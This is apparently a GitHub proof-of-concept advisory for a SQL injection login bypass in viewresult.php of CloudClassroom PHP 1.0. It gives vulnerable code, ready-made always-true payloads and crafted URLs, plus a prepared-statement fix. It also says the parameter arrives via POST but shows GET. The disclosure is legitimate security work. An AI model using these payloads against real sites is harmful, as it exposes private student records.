# Cloud-Classroom-PHP-1.0---Poc2


Presentation: SQL Injection Bypass Authentication in viewresult.php
Security vulnerability:
SQL Injection - Authentication Bypass

Vulnerability Type: Injection

Affected Component: viewresult.php page - parameter seno via POST

Software: CloudClassroom PHP Project

Version: 1.0 (discontinued)

Business Area: Education / e-Learning Platforms

Description of the issue: The viewresult.php page takes a GET parameter seno which is used directly in an SQL query without any sanitization or parameterization:

$seno = $_GET['seno'];
$sql = "SELECT * FROM result WHERE Eno='$seno'";
This allows attackers to inject SQL code in the seno parameter, bypassing authentication or any authorization logic.

Impact: 

Allows attacker to bypass authentication or filters by injecting always-true conditions.

Can return all rows in the result table regardless of the enrollment number.

May expose sensitive data such as student results or other protected information.

Steps to reproduce: Access the page with a crafted URL like:

http://target/viewresult.php?seno=' OR '1'='1
This will transform the query into:

SELECT * FROM result WHERE Eno='' OR '1'='1'
Which returns all results, bypassing any filtering by enrollment number.

Example payloads for authentication bypass:
Payload	Explanation
' OR '1'='1	Always true condition, returns all rows
' OR 1=1 -- -	Comments out rest of query, returns all rows
anything' OR 'x'='x	Bypass with always true condition

Example full URL for bypass:

http://target/viewresult.php?seno=' OR '1'='1
Or
http://target/viewresult.php?seno=' OR 1=1 -- -

Severity: High - bypasses any enrollment-based filtering, potentially exposing sensitive student data.

Recommended Fix: Use prepared statements with bound parameters to prevent injection.

Validate and sanitize all user input.

Use least privilege on DB user.

References:
CWE-89: SQL Injection
OWASP SQL Injection Prevention Cheat Sheet


SQL-Injection Bypass-Authentication

Payload: 1' or 1=1-- -'

<img width="1345" height="416" alt="image" src="https://github.com/user-attachments/assets/fd7aa3cc-f0fd-46d9-8f51-ed689c3d6204" />

Full-path disclosure

<img width="1417" height="470" alt="image" src="https://github.com/user-attachments/assets/b5a339a0-0930-4900-ad74-d55a97f93914" />


<img width="1330" height="269" alt="image" src="https://github.com/user-attachments/assets/97d8405e-0830-4ee6-81e6-9e9557b082a8" />
